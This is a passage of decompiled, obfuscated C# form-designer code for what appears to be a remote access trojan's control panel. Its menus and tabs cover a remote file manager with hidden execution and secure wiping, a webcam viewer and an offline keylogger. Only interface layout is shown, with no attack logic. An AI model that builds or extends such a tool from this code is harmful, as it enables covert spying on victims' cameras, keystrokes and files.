        this.vmethod_700().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_166().BackColor = Color.Transparent;
        this.vmethod_166().Location = new Point(0x15b, 0x37);
        this.vmethod_166().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_166().Name = "lblFilemanagerZIPCurrentfile";
        this.vmethod_166().RightToLeft = RightToLeft.Yes;
        this.vmethod_166().Size = new Size(0x60, 13);
        this.vmethod_166().TabIndex = 0x12;
        this.vmethod_166().Text = "N/A";
        this.vmethod_164().BackColor = Color.Transparent;
        this.vmethod_164().Location = new Point(5, 0x13);
        this.vmethod_164().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_164().Name = "lblFilemanagerZIPCurrent";
        this.vmethod_164().Size = new Size(0x1b5, 0x22);
        this.vmethod_164().TabIndex = 3;
        this.vmethod_164().Text = "Current: N/A";
        this.vmethod_164().TextAlign = ContentAlignment.TopCenter;
        this.vmethod_162().AutoSize = true;
        this.vmethod_162().BackColor = Color.Transparent;
        this.vmethod_162().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, 0);
        this.vmethod_162().Location = new Point(0x99, 2);
        this.vmethod_162().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_162().Name = "lblFilemanagerZIPTitle";
        this.vmethod_162().Size = new Size(0x89, 13);
        this.vmethod_162().TabIndex = 2;
        this.vmethod_162().Text = "Creating ZIP Archive...";
        this.vmethod_158().AutoSize = true;
        this.vmethod_158().BackColor = Color.Transparent;
        this.vmethod_158().Location = new Point(2, 0x37);
        this.vmethod_158().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_158().Name = "lblFilemanagerZIPProgress";
        this.vmethod_158().Size = new Size(0x33, 13);
        this.vmethod_158().TabIndex = 1;
        this.vmethod_158().Text = "Progress:";
        this.vmethod_160().set_AnimationInterval(100);
        this.vmethod_160().set_AutoAnimate(false);
        this.vmethod_160().set_BackColor(Color.White);
        this.vmethod_160().set_BorderColor(Color.Black);
        this.vmethod_160().set_BorderType(1);
        this.vmethod_160().set_ColorProgress(Color.Blue);
        this.vmethod_160().set_DisplayProgress(true);
        this.vmethod_160().set_ForeColor(Color.White);
        this.vmethod_160().Location = new Point(0x39, 0x37);
        this.vmethod_160().Margin = new Padding(2);
        this.vmethod_160().set_Maximum(100);
        this.vmethod_160().set_Minimum(0);
        this.vmethod_160().Name = "pbFilemanagerZIP";
        this.vmethod_160().set_RollBlockPercent(20);
        this.vmethod_160().set_RollingType(0);
        this.vmethod_160().set_RollTimer(200);
        this.vmethod_160().Size = new Size(0x11e, 13);
        this.vmethod_160().set_Step(5);
        this.vmethod_160().TabIndex = 0;
        this.vmethod_160().set_TextAlign(0);
        this.vmethod_160().set_TextColorType(1);
        this.vmethod_160().set_Value(0);
        this.vmethod_110().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_110().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray13 = new ToolStripItem[10];
        itemArray13[0] = this.vmethod_112();
        itemArray13[1] = this.vmethod_298();
        itemArray13[2] = this.vmethod_216();
        itemArray13[3] = this.vmethod_114();
        itemArray13[4] = this.vmethod_116();
        itemArray13[5] = this.vmethod_296();
        itemArray13[6] = this.vmethod_140();
        itemArray13[7] = this.vmethod_168();
        itemArray13[8] = this.vmethod_154();
        itemArray13[9] = this.vmethod_138();
        this.vmethod_110().Items.AddRange(itemArray13);
        this.vmethod_110().Name = "cmsInfo";
        this.vmethod_110().Size = new Size(0xa6, 0xb0);
        this.vmethod_112().Name = "tsFilemanagerDirsRefresh";
        this.vmethod_112().Size = new Size(0xa5, 0x16);
        this.vmethod_112().Text = "Refresh";
        this.vmethod_298().Name = "NewFolderToolStripMenuItem";
        this.vmethod_298().Size = new Size(0xa5, 0x16);
        this.vmethod_298().Text = "New folder";
        ToolStripItem[] itemArray14 = new ToolStripItem[] { this.vmethod_218(), this.vmethod_242() };
        this.vmethod_216().DropDownItems.AddRange(itemArray14);
        this.vmethod_216().Name = "OperationsToolStripMenuItem1";
        this.vmethod_216().Size = new Size(0xa5, 0x16);
        this.vmethod_216().Text = "Operations";
        ToolStripItem[] itemArray15 = new ToolStripItem[] { this.vmethod_220(), this.vmethod_222() };
        this.vmethod_218().DropDownItems.AddRange(itemArray15);
        this.vmethod_218().Name = "DeleteToolStripMenuItem1";
        this.vmethod_218().Size = new Size(0x75, 0x16);
        this.vmethod_218().Text = "Delete";
        this.vmethod_220().Name = "NormalToolStripMenuItem2";
        this.vmethod_220().Size = new Size(0x72, 0x16);
        this.vmethod_220().Text = "Normal";
        ToolStripItem[] itemArray16 = new ToolStripItem[9];
        itemArray16[0] = this.vmethod_224();
        itemArray16[1] = this.vmethod_226();
        itemArray16[2] = this.vmethod_228();
        itemArray16[3] = this.vmethod_230();
        itemArray16[4] = this.vmethod_232();
        itemArray16[5] = this.vmethod_234();
        itemArray16[6] = this.vmethod_236();
        itemArray16[7] = this.vmethod_238();
        itemArray16[8] = this.vmethod_240();
        this.vmethod_222().DropDownItems.AddRange(itemArray16);
        this.vmethod_222().Name = "SecureToolStripMenuItem1";
        this.vmethod_222().Size = new Size(0x72, 0x16);
        this.vmethod_222().Text = "Secure";
        this.vmethod_224().Name = "GermanVSITR7PassToolStripMenuItem1";
        this.vmethod_224().Size = new Size(0xe5, 0x16);
        this.vmethod_224().Text = "German VSITR (7 pass)";
        this.vmethod_226().Name = "BruceSchneier7PassToolStripMenuItem1";
        this.vmethod_226().Size = new Size(0xe5, 0x16);
        this.vmethod_226().Text = "Bruce Schneier (7 pass)";
        this.vmethod_228().Name = "BritishHMGIS53PassToolStripMenuItem1";
        this.vmethod_228().Size = new Size(0xe5, 0x16);
        this.vmethod_228().Text = "British HMG IS5 (3 pass)";
        this.vmethod_230().Name = "USDOD522022M3PassToolStripMenuItem1";
        this.vmethod_230().Size = new Size(0xe5, 0x16);
        this.vmethod_230().Text = "US DOD 5220.22-M (3 pass)";
        this.vmethod_232().Name = "NIST800882PassToolStripMenuItem";
        this.vmethod_232().Size = new Size(0xe5, 0x16);
        this.vmethod_232().Text = "NIST 800-88 (2 pass)";
        this.vmethod_234().Name = "RussianGOSTP507392PassToolStripMenuItem1";
        this.vmethod_234().Size = new Size(0xe5, 0x16);
        this.vmethod_234().Text = "Russian GOST P50739 (2 pass)";
        this.vmethod_236().Name = "ZeroFiller1PassToolStripMenuItem";
        this.vmethod_236().Size = new Size(0xe5, 0x16);
        this.vmethod_236().Text = "Zero filler (1 pass)";
        this.vmethod_238().Name = "OneFiller1PassToolStripMenuItem";
        this.vmethod_238().Size = new Size(0xe5, 0x16);
        this.vmethod_238().Text = "One filler (1 pass)";
        this.vmethod_240().Name = "RandomFiller1PassToolStripMenuItem1";
        this.vmethod_240().Size = new Size(0xe5, 0x16);
        this.vmethod_240().Text = "Random filler (1 pass)";
        this.vmethod_242().Name = "RenameToolStripMenuItem1";
        this.vmethod_242().Size = new Size(0x75, 0x16);
        this.vmethod_242().Text = "Rename";
        this.vmethod_114().Name = "ToolStripSeparator1";
        this.vmethod_114().Size = new Size(0xa2, 6);
        this.vmethod_116().Name = "tsFilemanagerDirsDownload";
        this.vmethod_116().Size = new Size(0xa5, 0x16);
        this.vmethod_116().Text = "Download";
        this.vmethod_296().Name = "tsFilemanagerDirsUpload";
        this.vmethod_296().Size = new Size(0xa5, 0x16);
        this.vmethod_296().Text = "Upload";
        this.vmethod_140().Name = "ToolStripMenuItem6";
        this.vmethod_140().Size = new Size(0xa2, 6);
        ToolStripItem[] itemArray17 = new ToolStripItem[] { this.vmethod_170() };
        this.vmethod_168().DropDownItems.AddRange(itemArray17);
        this.vmethod_168().Name = "CompressToolStripMenuItem1";
        this.vmethod_168().Size = new Size(0xa5, 0x16);
        this.vmethod_168().Text = "Compress";
        this.vmethod_170().Name = "AddToZIPToolStripMenuItem";
        this.vmethod_170().Size = new Size(130, 0x16);
        this.vmethod_170().Text = "Add to ZIP";
        this.vmethod_154().Name = "ToolStripMenuItem8";
        this.vmethod_154().Size = new Size(0xa2, 6);
        this.vmethod_138().Name = "TransferManagerToolStripMenuItem1";
        this.vmethod_138().Size = new Size(0xa5, 0x16);
        this.vmethod_138().Text = "Transfer manager";
        this.vmethod_102().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_102().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray18 = new ToolStripItem[12];
        itemArray18[0] = this.vmethod_104();
        itemArray18[1] = this.vmethod_144();
        itemArray18[2] = this.vmethod_106();
        itemArray18[3] = this.vmethod_108();
        itemArray18[4] = this.vmethod_294();
        itemArray18[5] = this.vmethod_142();
        itemArray18[6] = this.vmethod_172();
        itemArray18[7] = this.vmethod_176();
        itemArray18[8] = this.vmethod_380();
        itemArray18[9] = this.vmethod_690();
        itemArray18[10] = this.vmethod_812();
        itemArray18[11] = this.vmethod_136();
        this.vmethod_102().Items.AddRange(itemArray18);
        this.vmethod_102().Name = "cmsInfo";
        this.vmethod_102().Size = new Size(170, 0xcc);
        this.vmethod_104().Name = "tsFilemanagerFilesRefresh";
        this.vmethod_104().Size = new Size(0xa9, 0x16);
        this.vmethod_104().Text = "Refresh";
        ToolStripItem[] itemArray19 = new ToolStripItem[] { this.vmethod_182(), this.vmethod_188(), this.vmethod_152(), this.vmethod_244(), this.vmethod_146() };
        this.vmethod_144().DropDownItems.AddRange(itemArray19);
        this.vmethod_144().Name = "OperationsToolStripMenuItem";
        this.vmethod_144().Size = new Size(0xa9, 0x16);
        this.vmethod_144().Text = "Operations";
        ToolStripItem[] itemArray20 = new ToolStripItem[] { this.vmethod_184(), this.vmethod_186() };
        this.vmethod_182().DropDownItems.AddRange(itemArray20);
        this.vmethod_182().Name = "ExecuteToolStripMenuItem";
        this.vmethod_182().Size = new Size(0x75, 0x16);
        this.vmethod_182().Text = "Execute";
        this.vmethod_184().Name = "VisibleToolStripMenuItem";
        this.vmethod_184().Size = new Size(0x71, 0x16);
        this.vmethod_184().Text = "Visible";
        this.vmethod_186().Name = "HiddenToolStripMenuItem";
        this.vmethod_186().Size = new Size(0x71, 0x16);
        this.vmethod_186().Text = "Hidden";
        this.vmethod_188().Name = "ToolStripMenuItem10";
        this.vmethod_188().Size = new Size(0x72, 6);
        this.vmethod_152().Name = "RenameToolStripMenuItem";
        this.vmethod_152().Size = new Size(0x75, 0x16);
        this.vmethod_152().Text = "Rename";
        this.vmethod_244().Name = "ToolStripMenuItem11";
        this.vmethod_244().Size = new Size(0x72, 6);
        ToolStripItem[] itemArray21 = new ToolStripItem[] { this.vmethod_148(), this.vmethod_150() };
        this.vmethod_146().DropDownItems.AddRange(itemArray21);
        this.vmethod_146().Name = "DeleteToolStripMenuItem";
        this.vmethod_146().Size = new Size(0x75, 0x16);
        this.vmethod_146().Text = "Delete";
        this.vmethod_148().Name = "NormalToolStripMenuItem1";
        this.vmethod_148().Size = new Size(0x72, 0x16);
        this.vmethod_148().Text = "Normal";
        ToolStripItem[] itemArray22 = new ToolStripItem[9];
        itemArray22[0] = this.vmethod_178();
        itemArray22[1] = this.vmethod_180();
        itemArray22[2] = this.vmethod_190();
        itemArray22[3] = this.vmethod_192();
        itemArray22[4] = this.vmethod_194();
        itemArray22[5] = this.vmethod_196();
        itemArray22[6] = this.vmethod_198();
        itemArray22[7] = this.vmethod_200();
        itemArray22[8] = this.vmethod_202();
        this.vmethod_150().DropDownItems.AddRange(itemArray22);
        this.vmethod_150().Name = "SecureToolStripMenuItem";
        this.vmethod_150().Size = new Size(0x72, 0x16);
        this.vmethod_150().Text = "Secure";
        this.vmethod_178().Name = "GermanVSITR7PassToolStripMenuItem";
        this.vmethod_178().Size = new Size(0xe5, 0x16);
        this.vmethod_178().Text = "German VSITR (7 pass)";
        this.vmethod_180().Name = "BruceSchneier7PassToolStripMenuItem";
        this.vmethod_180().Size = new Size(0xe5, 0x16);
        this.vmethod_180().Text = "Bruce Schneier (7 pass)";
        this.vmethod_190().Name = "BritishHMGIS53PassToolStripMenuItem";
        this.vmethod_190().Size = new Size(0xe5, 0x16);
        this.vmethod_190().Text = "British HMG IS5 (3 pass)";
        this.vmethod_192().Name = "UsDOD522022M3PassToolStripMenuItem";
        this.vmethod_192().Size = new Size(0xe5, 0x16);
        this.vmethod_192().Text = "US DOD 5220.22-M (3 pass)";
        this.vmethod_194().Name = "NIST800883PassToolStripMenuItem";
        this.vmethod_194().Size = new Size(0xe5, 0x16);
        this.vmethod_194().Text = "NIST 800-88 (2 pass)";
        this.vmethod_196().Name = "RussianGOSTP507392PassToolStripMenuItem";
        this.vmethod_196().Size = new Size(0xe5, 0x16);
        this.vmethod_196().Text = "Russian GOST P50739 (2 pass)";
        this.vmethod_198().Name = "ZeroFillerToolStripMenuItem";
        this.vmethod_198().Size = new Size(0xe5, 0x16);
        this.vmethod_198().Text = "Zero filler (1 pass)";
        this.vmethod_200().Name = "OneFillerToolStripMenuItem";
        this.vmethod_200().Size = new Size(0xe5, 0x16);
        this.vmethod_200().Text = "One filler (1 pass)";
        this.vmethod_202().Name = "RandomFiller1PassToolStripMenuItem";
        this.vmethod_202().Size = new Size(0xe5, 0x16);
        this.vmethod_202().Text = "Random filler (1 pass)";
        this.vmethod_106().Name = "ToolStripMenuItem5";
        this.vmethod_106().Size = new Size(0xa6, 6);
        this.vmethod_108().Name = "tsFilemanagerFilesDownload";
        this.vmethod_108().Size = new Size(0xa9, 0x16);
        this.vmethod_108().Text = "Download";
        this.vmethod_294().Name = "tsFilemanagerFilesUpload";
        this.vmethod_294().Size = new Size(0xa9, 0x16);
        this.vmethod_294().Text = "Upload";
        this.vmethod_142().Name = "ToolStripMenuItem7";
        this.vmethod_142().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray23 = new ToolStripItem[] { this.vmethod_174() };
        this.vmethod_172().DropDownItems.AddRange(itemArray23);
        this.vmethod_172().Name = "CompressToolStripMenuItem";
        this.vmethod_172().Size = new Size(0xa9, 0x16);
        this.vmethod_172().Text = "Compress";
        this.vmethod_174().Name = "AddToZIPToolStripMenuItem1";
        this.vmethod_174().Size = new Size(130, 0x16);
        this.vmethod_174().Text = "Add to ZIP";
        this.vmethod_176().Name = "ToolStripMenuItem9";
        this.vmethod_176().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray24 = new ToolStripItem[] { this.vmethod_384(), this.vmethod_440(), this.vmethod_382() };
        this.vmethod_380().DropDownItems.AddRange(itemArray24);
        this.vmethod_380().Name = "CopyToClipboardToolStripMenuItem";
        this.vmethod_380().Size = new Size(0xa9, 0x16);
        this.vmethod_380().Text = "Copy to clipboard";
        this.vmethod_384().Name = "FilemanagerCopySelectedToolStripMenuItem1";
        this.vmethod_384().Size = new Size(0x76, 0x16);
        this.vmethod_384().Text = "Selected";
        this.vmethod_440().Name = "ToolStripMenuItem19";
        this.vmethod_440().Size = new Size(0x73, 6);
        this.vmethod_382().Name = "FilemanagerCopyAllToolStripMenuItem";
        this.vmethod_382().Size = new Size(0x76, 0x16);
        this.vmethod_382().Text = "All";
        this.vmethod_690().Name = "ToolStripMenuItem38";
        this.vmethod_690().Size = new Size(0xa6, 6);
        this.vmethod_812().Name = "ShowThumbnailsToolStripMenuItem";
        this.vmethod_812().Size = new Size(0xa9, 0x16);
        this.vmethod_812().Text = "Show thumbnails";
        this.vmethod_136().Name = "TransferManagerToolStripMenuItem";
        this.vmethod_136().Size = new Size(0xa9, 0x16);
        this.vmethod_136().Text = "Transfer manager";
        this.vmethod_252().BackColor = Color.Transparent;
        this.vmethod_252().Controls.Add(this.vmethod_716());
        this.vmethod_252().Controls.Add(this.vmethod_558());
        this.vmethod_252().Controls.Add(this.vmethod_268());
        this.vmethod_252().Controls.Add(this.vmethod_254());
        this.vmethod_252().Controls.Add(this.vmethod_256());
        this.vmethod_252().Controls.Add(this.vmethod_258());
        this.vmethod_252().Controls.Add(this.vmethod_260());
        this.vmethod_252().Controls.Add(this.vmethod_262());
        this.vmethod_252().Controls.Add(this.vmethod_264());
        this.vmethod_252().Location = new Point(4, 5);
        this.vmethod_252().Margin = new Padding(2);
        this.vmethod_252().Name = "tbWebcam";
        this.vmethod_252().Padding = new Padding(2);
        this.vmethod_252().Size = new Size(0x3d0, 0x221);
        this.vmethod_252().TabIndex = 4;
        this.vmethod_252().Text = "Webcam";
        this.vmethod_716().BackColorState.Disabled = Color.FromArgb(0xcc, 0xcc, 0xcc);
        this.vmethod_716().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_716().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_716().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_716().Border.HoverVisible = true;
        this.vmethod_716().Border.Rounding = 6;
        this.vmethod_716().Border.Thickness = 1;
        this.vmethod_716().Border.Type = ShapeTypes.Rounded;
        this.vmethod_716().Border.Visible = true;
        this.vmethod_716().ButtonBorder.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_716().ButtonBorder.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_716().ButtonBorder.HoverVisible = true;
        this.vmethod_716().ButtonBorder.Rounding = 6;
        this.vmethod_716().ButtonBorder.Thickness = 1;
        this.vmethod_716().ButtonBorder.Type = ShapeTypes.Rounded;
        this.vmethod_716().ButtonBorder.Visible = true;
        this.vmethod_716().ButtonBottomMouseState = MouseStates.Normal;
        this.vmethod_716().ButtonColorState.Disabled = Color.FromArgb(220, 220, 220);
        this.vmethod_716().ButtonColorState.Enabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_716().ButtonColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_716().ButtonColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_716().ButtonTopMouseState = MouseStates.Normal;
        this.vmethod_716().Enabled = false;
        this.vmethod_716().Location = new Point(0x1c9, 11);
        this.vmethod_716().MouseState = MouseStates.Normal;
        this.vmethod_716().Name = "tbWebcamQuality";
        this.vmethod_716().Orientation = Orientation.Horizontal;
        this.vmethod_716().Size = new Size(0x58, 0x13);
        this.vmethod_716().TabIndex = 0x27;
        this.vmethod_716().TabStop = false;
        this.vmethod_716().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_716().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_716().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_716().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_716().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_716().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_716().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_716().ThumbBorder.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_716().ThumbBorder.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_716().ThumbBorder.HoverVisible = true;
        this.vmethod_716().ThumbBorder.Rounding = 6;
        this.vmethod_716().ThumbBorder.Thickness = 1;
        this.vmethod_716().ThumbBorder.Type = ShapeTypes.Rounded;
        this.vmethod_716().ThumbBorder.Visible = true;
        this.vmethod_716().ThumbColorState.Disabled = Color.FromArgb(0xdd, 0xdd, 0xdd);
        this.vmethod_716().ThumbColorState.Enabled = Color.FromArgb(0xdd, 0xdd, 0xdd);
        this.vmethod_716().ThumbColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_716().ThumbColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_716().ThumbGripVisible = true;
        this.vmethod_716().ThumbMouseState = MouseStates.Normal;
        this.vmethod_716().TrackPressed = Color.FromArgb(10, 0, 0, 0);
        this.vmethod_558().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_558().BackColor = Color.Transparent;
        this.vmethod_558().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_558().ForeColor = Color.Black;
        this.vmethod_558().Location = new Point(690, 10);
        this.vmethod_558().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_558().Name = "lblWebcamFPS";
        this.vmethod_558().Size = new Size(0x117, 0x15);
        this.vmethod_558().TabIndex = 0x26;
        this.vmethod_558().Text = "FPS: N/A";
        this.vmethod_558().TextAlign = ContentAlignment.MiddleRight;
        this.vmethod_268().BackColor = Color.White;
        this.vmethod_268().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_268().Enabled = false;
        this.vmethod_268().ForeColor = Color.Black;
        this.vmethod_268().FormattingEnabled = true;
        this.vmethod_268().Location = new Point(0x77, 10);
        this.vmethod_268().Margin = new Padding(2);
        this.vmethod_268().Name = "cbWebcamDevices";
        this.vmethod_268().Size = new Size(0xe5, 0x15);
        this.vmethod_268().TabIndex = 0x25;
        this.vmethod_254().AutoSize = true;
        this.vmethod_254().BackColor = Color.Transparent;
        this.vmethod_254().ForeColor = Color.Black;
        this.vmethod_254().Location = new Point(0x222, 14);
        this.vmethod_254().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_254().Name = "lblWebcamQualityValue";
        this.vmethod_254().Size = new Size(0x1b, 13);
        this.vmethod_254().TabIndex = 0x22;
        this.vmethod_254().Text = "50%";
        this.vmethod_256().AutoSize = true;
        this.vmethod_256().BackColor = Color.Transparent;
        this.vmethod_256().ForeColor = Color.Black;
        this.vmethod_256().Location = new Point(0x19e, 13);
        this.vmethod_256().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_256().Name = "lblWebcamQuality";
        this.vmethod_256().Size = new Size(0x2a, 13);
        this.vmethod_256().TabIndex = 0x21;
        this.vmethod_256().Text = "Quality:";
        this.vmethod_258().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_258().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_258().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_258().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_258().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_258().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_258().Border.HoverVisible = true;
        this.vmethod_258().Border.Rounding = 6;
        this.vmethod_258().Border.Thickness = 1;
        this.vmethod_258().Border.Type = ShapeTypes.Rounded;
        this.vmethod_258().Border.Visible = true;
        this.vmethod_258().DialogResult = DialogResult.None;
        this.vmethod_258().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_258().Image = null;
        this.vmethod_258().Location = new Point(0x161, 11);
        this.vmethod_258().MouseState = MouseStates.Normal;
        this.vmethod_258().Name = "btnWebcamRefresh";
        this.vmethod_258().Size = new Size(50, 0x12);
        this.vmethod_258().TabIndex = 0x20;
        this.vmethod_258().TabStop = false;
        this.vmethod_258().Text = "Refresh";
        this.vmethod_258().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_258().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_258().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_258().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_258().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_258().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_258().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_258().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_260().AutoSize = true;
        this.vmethod_260().BackColor = Color.Transparent;
        this.vmethod_260().ForeColor = Color.Black;
        this.vmethod_260().Location = new Point(0x47, 13);
        this.vmethod_260().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_260().Name = "lblWebcamDevice";
        this.vmethod_260().Size = new Size(0x2c, 13);
        this.vmethod_260().TabIndex = 0x1f;
        this.vmethod_260().Text = "Device:";
        this.vmethod_262().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_262().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_262().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_262().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_262().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_262().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_262().Border.HoverVisible = true;
        this.vmethod_262().Border.Rounding = 6;
        this.vmethod_262().Border.Thickness = 1;
        this.vmethod_262().Border.Type = ShapeTypes.Rounded;
        this.vmethod_262().Border.Visible = true;
        this.vmethod_262().DialogResult = DialogResult.None;
        this.vmethod_262().Enabled = false;
        this.vmethod_262().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_262().Image = null;
        this.vmethod_262().Location = new Point(1, 7);
        this.vmethod_262().MouseState = MouseStates.Normal;
        this.vmethod_262().Name = "btnWebcamStartStop";
        this.vmethod_262().Size = new Size(0x3f, 0x18);
        this.vmethod_262().TabIndex = 0x1c;
        this.vmethod_262().TabStop = false;
        this.vmethod_262().Text = "Start";
        this.vmethod_262().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_262().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_262().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_262().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_262().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_262().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_262().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_262().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_270().Controls.Add(this.vmethod_816());
        this.vmethod_270().Controls.Add(this.vmethod_712());
        this.vmethod_270().Controls.Add(this.vmethod_704());
        this.vmethod_270().Controls.Add(this.vmethod_702());
        this.vmethod_270().Controls.Add(this.vmethod_556());
        this.vmethod_270().Controls.Add(this.vmethod_482());
        this.vmethod_270().Controls.Add(this.vmethod_386());
        this.vmethod_270().Controls.Add(this.vmethod_388());
        this.vmethod_270().Controls.Add(this.vmethod_280());
        this.vmethod_270().Controls.Add(this.vmethod_290());
        this.vmethod_270().Location = new Point(4, 5);
        this.vmethod_270().Margin = new Padding(2);
        this.vmethod_270().Name = "tbKeylogOffline";
        this.vmethod_270().Padding = new Padding(2);
        this.vmethod_270().Size = new Size(0x3d0, 0x221);
        this.vmethod_270().TabIndex = 5;
        this.vmethod_270().Text = "Offline keylogger";
        this.vmethod_270().UseVisualStyleBackColor = true;
        this.vmethod_816().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_816().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_816().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_816().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_816().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_816().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_816().Border.HoverVisible = true;
        this.vmethod_816().Border.Rounding = 6;
        this.vmethod_816().Border.Thickness = 1;
        this.vmethod_816().Border.Type = ShapeTypes.Rounded;
        this.vmethod_816().Border.Visible = true;
        this.vmethod_816().DialogResult = DialogResult.None;
        this.vmethod_816().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_816().Image = null;
        this.vmethod_816().Location = new Point(0x14e, 3);
        this.vmethod_816().MouseState = MouseStates.Normal;
        this.vmethod_816().Name = "btnKeylogOfflineSave";
        this.vmethod_816().Size = new Size(0x3e, 0x13);
        this.vmethod_816().TabIndex = 0x35;
        this.vmethod_816().Text = "Save";
        this.vmethod_816().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_816().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_816().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_816().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_816().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_816().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_816().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_816().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_712().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_712().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_712().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_712().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_712().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_712().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_712().Border.HoverVisible = true;
        this.vmethod_712().Border.Rounding = 6;
        this.vmethod_712().Border.Thickness = 1;
        this.vmethod_712().Border.Type = ShapeTypes.Rounded;
        this.vmethod_712().Border.Visible = true;
        this.vmethod_712().DialogResult = DialogResult.None;
        this.vmethod_712().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_712().Image = null;
        this.vmethod_712().Location = new Point(3, 3);
        this.vmethod_712().MouseState = MouseStates.Normal;
        this.vmethod_712().Name = "btnKeylogOfflineGetLogs";
        this.vmethod_712().Size = new Size(0x3e, 0x13);
